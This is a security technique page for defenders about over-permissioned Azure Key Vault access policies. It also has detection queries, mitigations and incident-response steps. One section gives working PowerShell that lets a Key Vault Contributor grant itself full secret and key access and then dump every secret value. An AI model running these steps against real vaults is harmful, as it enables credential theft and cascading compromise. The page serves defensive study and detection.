# [MISCONFIG-008]: Key Vault Access Policy Overpermission

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-008 |
| **MITRE ATT&CK v18.1** | [Cloud Service Discovery (T1526)](https://attack.mitre.org/techniques/T1526/) |
| **Tactic** | Discovery / Credential Access / Privilege Escalation |
| **Platforms** | Azure Key Vault, Entra ID, Azure Resource Manager |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Key Vaults using access policies and/or data‑plane RBAC in Azure Resource Manager model |
| **Patched In** | N/A – configuration and role‑design issue; mitigated via Azure RBAC data‑plane permissions, least privilege, and elimination of legacy access policies.
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Key Vault controls access to secrets, keys, and certificates using either legacy **access policies** or **Azure RBAC** on the data plane. Over‑permissioned access policies (e.g., `Get`, `List`, `Set`, `Delete` for `secrets`/`keys` for broad user groups or service principals) or mis‑scoped roles (e.g., Key Vault Contributor able to modify access policies) allow attackers to escalate privileges and exfiltrate secrets, including API keys, storage account keys, certificates, and application passwords. Because many downstream services rely on Key Vault, compromise of a single vault can cascade to multiple environments.
- **Attack Surface:**
  - Key Vaults using **access policy** model with broad principals (all developers, operations, automation accounts) granted full secret/key permissions.
  - Use of **Key Vault Contributor** role to manage vault configuration while still allowing that role to add themselves to access policies and thereby gain data‑plane read access.
  - Vaults reachable from public network without firewall restrictions or private endpoints, increasing the blast radius of credential theft.
- **Business Impact:** **Full compromise of secrets and cryptographic material** anchored in Key Vault, including:
  - Application connection strings, storage account keys, SQL passwords.
  - Certificates used for TLS termination, federation (ADFS), and service principals.
  - Managed identity tokens indirectly (through secrets for automation accounts or service accounts).
- **Technical Context:** Microsoft now recommends **Azure RBAC** for Key Vault data‑plane access and treats access policies as legacy due to their poor integration with PIM, auditing, and least‑privilege models. Research has shown that the **Key Vault Contributor** role, when used with access policies, can effectively grant itself data‑plane access by editing policies, enabling privilege escalation even when RBAC appears to restrict data access. Over‑permissioned access policies and roles are therefore a high‑value target for attackers who already possess some level of Azure access.

### Operational Risk
- **Execution Risk:** Medium – Tightening permissions can initially break applications if dependencies are not well understood; requires staged rollout.
- **Stealth:** High – Once a principal has legitimate data‑plane read permissions, secret retrieval operations look like normal usage unless specifically baselined.
- **Reversibility:** Medium – Permissions can be corrected, but secrets and keys already exfiltrated cannot be revoked retroactively; credentials must be rotated across dependent systems.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Azure Foundations** | AZURE 3.x – Key Management | Requires least‑privilege access to Key Vault secrets/keys; discourages broad access policies.|
| **DISA STIG** | SRG‑APP‑000231 / SRG‑APP‑000340 | Key management and protection of cryptographic material; mandate restrictions on who can access cryptographic keys. |
| **CISA SCuBA** | Secrets Management | Guidance to secure cloud key management services and avoid over‑permissioned IAM roles around KMS/KV. |
| **NIST 800‑53 Rev5** | AC‑3, AC‑6, SC‑12, SC‑13, SC‑28 | Access control, least privilege, cryptographic key management, and protection of information at rest.|
| **GDPR** | Art. 32 | Security of processing; leakage of secrets controlling access to personal data is a control failure. |
| **DORA** | Art. 9 | ICT risk management, including secure cryptographic key management for financial services. |
| **NIS2** | Art. 21 | Measures for cryptography and key management as part of cyber risk controls. |
| **ISO 27001:2022** | A.8.24, A.8.28 | Protection of cryptographic keys and secure key lifecycle management. |
| **ISO 27005** | "Compromise of Central Key Management Service" | Risk scenario describing cascading failures when the central secrets store is breached. |

---

## 3. TECHNICAL PREREQUISITES
- **Required Privileges (Misconfig Creation):**
  - Azure RBAC roles such as **Key Vault Contributor**, **Owner**, or custom roles with `Microsoft.KeyVault/vaults/write` and `Microsoft.KeyVault/vaults/accessPolicies/write` permissions.
- **Required Access (Attacker Exploitation):**
  - Ability to authenticate to Azure and Key Vault as a principal included in an over‑permissive access policy or holding a mis‑designed role that lets them modify access policies.

**Supported Versions:**
- All Azure Key Vaults (standard and premium SKUs) using access policy or RBAC data‑plane permission models.

- **Tools:**
  - Azure Portal – Key Vault blade (Access configuration, Access policies, Networking).
  - Azure CLI – `az keyvault` commands.
  - Azure PowerShell – `Az.KeyVault` module.
  - Third‑party scanners (CSPM/CNAPP, Datadog, Orca) that flag over‑privileged Key Vault roles and policies.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```powershell
Connect-AzAccount

Get-AzSubscription | ForEach-Object {
  Set-AzContext -SubscriptionId $_.Id | Out-Null
  Get-AzKeyVault | ForEach-Object {
    $vault = $_
    [PSCustomObject]@{
      Subscription = $_.ResourceId.Split('/')[2]
      VaultName    = $vault.VaultName
      ResourceGroup= $vault.ResourceGroupName
      AccessModel  = if ($vault.EnableRbacAuthorization) { 'RBAC' } else { 'AccessPolicy' }
      PublicAccess = if ($vault.NetworkAcls.DefaultAction -eq 'Allow') { 'Public' } else { 'Restricted' }
    }
  }
} | Format-Table -AutoSize
```

**What to Look For:**
- Vaults with `AccessModel` = `AccessPolicy` and public network access (`DefaultAction = Allow`) – legacy and high‑risk.

**Enumerate Access Policies:**
```powershell
$vault = Get-AzKeyVault -VaultName "<vault-name>" -ResourceGroupName "<rg>"
$vault.AccessPolicies | Select-Object DisplayName, ObjectId, TenantId, \
  PermissionsToSecrets, PermissionsToKeys, PermissionsToCertificates
```

**What to Look For:**
- Principals (users, groups, SPNs) with `Get`, `List`, `Set`, `Delete` across **all** secrets/keys, especially generic groups (e.g., `Developers`, `DevOps`) and broad service principals.

#### Azure CLI / Bash Reconnaissance

```bash
az keyvault list --query "[].{name:name, resourceGroup:resourceGroup, enableRbacAuthorization:properties.enableRbacAuthorization, defaultAction:properties.networkAcls.defaultAction}" -o table

# For each vault in access policy mode, list access policies
VAULT="<vault-name>"
az keyvault show --name $VAULT -o json | jq '.properties.accessPolicies[] | {objectId, tenantId, permissions}'
```

**What to Look For:**
- Any access policy where `permissions.secrets` or `permissions.keys` contain `get`, `list`, `set`, `delete` and `objectId` corresponds to highly privileged roles or large user groups.

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Escalation via Key Vault Contributor and Access Policies

**Supported Versions:** All Key Vaults using access policy model with principals assigned the **Key Vault Contributor** role at subscription or resource group scope.
#### Step 1: Identify Principals with Key Vault Contributor
**Objective:** Find users or service principals that can modify Key Vault access policies.

```powershell
Connect-AzAccount

Get-AzRoleAssignment -RoleDefinitionName "Key Vault Contributor" | \
  Select-Object PrincipalName, PrincipalType, Scope
```

**What This Means:**
- Any listed principal can modify vault configuration and, in access policy mode, add themselves to the Access Policies list, effectively elevating to data‑plane access despite documentation implying they cannot read secrets.[7][10]

#### Step 2: Modify Access Policy to Grant Self Full Secret Access
**Objective (Attacker / Red Team):** As a Key Vault Contributor, add own identity to access policies with full permissions.

```powershell
$vaultName = "<vault-name>"
$rg        = "<vault-rg>"
$me        = Get-AzADUser -UserPrincipalName "<attacker-upn>"

Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $rg `
  -ObjectId $me.Id -PermissionsToSecrets get,list,set,delete,backup,restore,recover,purge `
  -PermissionsToKeys get,list,unwrapKey,wrapKey,sign,verify,backup,restore,recover,purge
```

**Expected Output:**
- Access policy updated. The attacker can now read, write, and delete secrets and keys in the vault.

**What This Means:**
- This is effectively a **privilege escalation** from “manage vault” to “read vault data” by abusing overlapping permission models (control plane RBAC + data‑plane access policies).
#### Step 3: Enumerate and Exfiltrate Secrets

```powershell
$vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $rg
Get-AzKeyVaultSecret -VaultName $vault.VaultName | ForEach-Object {
  $secret = Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $_.Name
  [PSCustomObject]@{
    Name  = $secret.Name
    Value = $secret.SecretValueText
  }
}
```

**Expected Output:**
- List of secret names and values, including DB passwords, API keys, and other credentials.

**References & Proofs:**
- Datadog Security Labs – *Escalating privileges to read secrets with Azure Key Vault access policies*.
- Independent research on Key Vault role and access policy interactions and privilege escalation paths.

### METHOD 2 – Over‑Broad Access Policies for Dev/Test Groups

**Supported Versions:** Key Vaults using access policies where entire groups are granted full access for “convenience”.

#### Step 1: Identify Group‑Scoped Policies

```powershell
$vault = Get-AzKeyVault -VaultName "<vault-name>" -ResourceGroupName "<rg>"
$vault.AccessPolicies | Where-Object { $_.PermissionsToSecrets -contains 'get' -and $_.DisplayName -like '*Dev*' } |
  Select-Object DisplayName, ObjectId, PermissionsToSecrets, PermissionsToKeys
```

**What This Means:**
- Any user added to such a group automatically gains full Key Vault data access; compromise of one low‑privileged developer account yields vault compromise.

#### Step 2: Use Delegated Permissions to Pull Secrets
- Once member of the group, operations identical to Step 3 in Method 1 allow retrieval of secrets.

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

There is no dedicated Atomic test for Azure Key Vault access policy privilege escalation, but cloud key‑management abuse is typically modeled under:
- T1552 (Unsecured Credentials) – secrets and keys stored in Key Vault.
- T1526 (Cloud Service Discovery) – enumeration of KMS/KV resources.

Security teams can:
- Deploy a lab Key Vault with access policy model and a user assigned Key Vault Contributor.
- Execute Method 1 to validate that Contributor can elevate to data‑plane read, then implement RBAC‑only model and verify mitigation.

---

## 7. TOOLS & COMMANDS REFERENCE

#### Az.KeyVault PowerShell Module

```powershell
Install-Module Az.KeyVault -Scope CurrentUser
Import-Module Az.KeyVault

Get-AzKeyVault
```

#### Azure CLI – Key Vault

```bash
# List vaults and access model
az keyvault list --query "[].{name:name, enableRbac:properties.enableRbacAuthorization}" -o table

# Show access policies
az keyvault show --name <vault-name> -o json | jq '.properties.accessPolicies[]'
```

#### Script (One-Liner – Flag Over‑Permissive Policies)
```powershell
Connect-AzAccount
Get-AzSubscription | ForEach-Object {
  Set-AzContext -SubscriptionId $_.Id | Out-Null
  Get-AzKeyVault | ForEach-Object {
    $v = $_
    if (-not $v.EnableRbacAuthorization) {
      $v.AccessPolicies | Where-Object {
        $_.PermissionsToSecrets -contains 'get' -and $_.PermissionsToSecrets -contains 'list'
      } | Select-Object @{n='Subscription';e={$_.TenantId}},
                        @{n='Vault';e={$v.VaultName}}, DisplayName, PermissionsToSecrets
    }
  }
}
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Key Vault Access Policies Modified to Grant Broad Access
**Rule Configuration:**
- **Required Index:** `azure_activity`.
- **Required Sourcetype:** `azure:activity`.
- **Required Fields:** `operationName`, `properties`, `resourceId`.
- **Alert Threshold:** Any `Microsoft.KeyVault/vaults/write` or `.../accessPolicies/write` operation adding principals with full secret/key permissions.

**SPL Query:**
```spl
index=azure_activity ResourceProviderValue="MICROSOFT.KEYVAULT" \
  (operationName="Microsoft.KeyVault/vaults/write" OR \
   operationName="Microsoft.KeyVault/vaults/accessPolicies/write")
| eval props = spath(_raw, "properties")
| eval response = spath(props, "responseBody"),
       accessPolicies = spath(response, "properties.accessPolicies{}")
| mvexpand accessPolicies
| eval permsSecrets = spath(accessPolicies, "permissions.secrets{}"),
       permsKeys    = spath(accessPolicies, "permissions.keys{}"),
       objectId     = spath(accessPolicies, "objectId")
| where mvfind(permsSecrets, "get")>=0 AND mvfind(permsSecrets, "list")>=0 AND mvcount(permsSecrets)>=4
| stats latest(_time) AS lastChange, values(permsSecrets) AS perms BY resourceId, objectId
```

**What This Detects:**
- Key Vault access policy changes that grant broad secret permissions to identities.

**Source:** Datadog Security Labs research on Key Vault Contributor and access policies; Microsoft Key Vault security best practices.

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Key Vault Access Policy Escalation

**Rule Configuration:**
- **Required Table:** `AzureActivity`.
- **Required Fields:** `OperationNameValue`, `ResourceProviderValue`, `Properties`, `ResourceId`.
- **Alert Severity:** High.

**KQL Query:**
```kusto
AzureActivity
| where ResourceProviderValue == "MICROSOFT.KEYVAULT"
| where OperationNameValue in ("MICROSOFT.KEYVAULT/VAULTS/WRITE", 
                               "MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE")
| extend props = parse_json(Properties)
| extend response = parse_json(tostring(props.responseBody))
| extend aps = response.properties.accessPolicies
| mv-expand aps
| extend objId = tostring(aps.objectId),
         permsSecrets = tostring(aps.permissions.secrets),
         permsKeys    = tostring(aps.permissions.keys)
| where permsSecrets has "get" and permsSecrets has "list" and permsSecrets has "delete"
| project TimeGenerated, ResourceId, objId, permsSecrets, permsKeys, Caller
```

**What This Detects:**
- Key Vault access policy changes granting extensive secret permissions.

**Source:** Microsoft guidance on secure Key Vault configuration and Defender for Cloud identity recommendations.

---

## 10. WINDOWS EVENT LOG MONITORING

Key Vault actions are cloud‑side; Windows event logs help only to attribute use of tooling from admin workstations (PowerShell, Azure CLI). Enable:
- Event ID 4104 (PowerShell Script Block Logging) for scripts manipulating Key Vault.
- Event ID 4688 for process creation involving `az`, `pwsh`, or `powershell.exe` with `Az.KeyVault` usage.

---

## 11. SYSMON DETECTION PATTERNS

Sysmon can watch for repeated execution of key‑management scripts from non‑admin endpoints, but primary telemetry should be cloud‑side.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Examples:**
- *Key Vault should use RBAC permission model*.
- *Key vaults should restrict network access*.
- *Secrets in Key Vault accessed from anomalous IP*.

- **Severity:** High/Critical depending on scenario.
- **Description:** Recommends migrating from access policies to RBAC, restricting network access, and monitoring anomalous secret access.

**Manual Configuration Steps:**
1. Defender for Cloud → **Environment settings** → select subscription.
2. Enable **Defender for Key Vault** where available.
3. Follow recommendation **"Key vault should use RBAC permission model"** to migrate to RBAC.
4. Enable alerts for anomalous Key Vault access.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

Key Vault data‑plane operations are not logged in the M365 unified audit log, but:
- Use **Azure Monitor / Key Vault diagnostic settings** to send logs to Log Analytics / Sentinel.
- Audit logs record operations such as `SecretGet`, `SecretList`, `VaultAccessPolicyWrite` and should be monitored for spikes or unusual identities.

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Migrate to RBAC Permission Model for Key Vault**
  - **Action:** Disable legacy access policies and enable RBAC for all new and existing vaults where feasible.
  **Manual Steps (Portal):**
  1. Key Vault → **Access configuration**.
  2. Select **Azure role-based access control** instead of **Vault access policy**.
  3. Save and then configure appropriate data‑plane RBAC roles (Key Vault Secrets User, Secrets Officer, etc.).

* **Remove Over‑Permissive Access Policies**
  - Audit and remove any policies granting full secrets/keys access to large groups or non‑admin users.

#### Priority 2: HIGH

* **Constrain Key Vault Contributor Role**
  - Avoid assigning Key Vault Contributor at broad scopes; prefer scoped, time‑bound role assignments via PIM.

* **Network Hardening**
  - Restrict Key Vault to private endpoints and trusted VNets; deny public network access where possible.

#### Validation Command (Verify Fix)
```powershell
Connect-AzAccount
Get-AzSubscription | ForEach-Object {
  Set-AzContext -SubscriptionId $_.Id | Out-Null
  Get-AzKeyVault | ForEach-Object {
    $v = $_
    if (-not $v.EnableRbacAuthorization) {
      Write-Output "[!] Vault $($v.VaultName) still using access policies"
    }
    elseif ($v.EnableRbacAuthorization -and $v.AccessPolicies.Count -gt 0) {
      Write-Output "[!] Vault $($v.VaultName) has RBAC enabled but still contains access policies (check IaC templates)."
    }
  }
}
```

**Expected Output (If Secure):**
- No warnings; all vaults show RBAC enabled and no legacy access policies.

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
* **Cloud:**
  - Sudden spikes in `SecretGet` / `KeyGet` operations by unusual identities.
  - Creation of new broad access policies shortly before large secret read operations.

#### Forensic Artifacts
* **Cloud:**
  - Key Vault diagnostic logs: operations, caller IPs, identity, and result codes.
  - Azure Activity logs for access policy or RBAC role assignment changes.

#### Response Procedures
1. **Isolate:**
   - Temporarily revoke suspect access policies or disable compromised identities.
2. **Collect Evidence:**
   - Export Key Vault logs, role assignments, and access policies for the affected timeframe.
3. **Remediate:**
   - Rotate all secrets/keys exposed in the compromised vault; update dependent services.
   - Migrate to RBAC model and apply least privilege.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Discovery** | REC-CLOUD-007 – Azure Key Vault access enumeration | Attacker identifies vaults and principals with access. |
| **2** | **Privilege Escalation** | MISCONFIG-008 – Key Vault Access Policy Overpermission | Abuses Contributor role or broad access policies to gain data‑plane access. |
| **3** | **Credential Access** | CA-UNSC-007/008/009 – Key Vault secrets/keys extraction | Attacker exports secrets, keys, and certificates. |
| **4** | **Lateral Movement** | CA-TOKEN-003/010 – Use of extracted secrets to access downstream services | Compromise of storage, SQL, or other apps. |
| **5** | **Impact** | DATA-EXFIL-XXX | Exfiltration of sensitive data using newly obtained credentials. |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Key Vault Contributor Role Abuse (Research Case Study)
- **Target:** Azure environment where Key Vault Contributor role was widely assigned to operations engineers.
- **Timeline:** 2024–2025.
- **Technique Status:** Researchers showed that Key Vault Contributor could modify access policies on access‑policy‑mode vaults and grant themselves full data‑plane access, contradicting assumptions that they could not read secrets.
- **Impact:** Demonstrated that misaligned role design and legacy access policies can lead to full secret compromise and privilege escalation, prompting Microsoft to update documentation and recommend RBAC model.

#### Example 2: Over‑Permissive Access Policies in Production Vaults
- **Target:** Enterprises using shared Key Vaults for multiple applications.
- **Timeline:** Ongoing – repeatedly observed in security assessments and cloud posture scans.
- **Technique Status:** Many vaults grant full secret access to large AD groups or generic service principals; compromise of any member results in full vault compromise and downstream access to databases, storage, and third‑party APIs.
- **Impact:** Elevated risk of cross‑application compromise and large‑scale credential leakage until access models are refactored to RBAC and least privilege.

---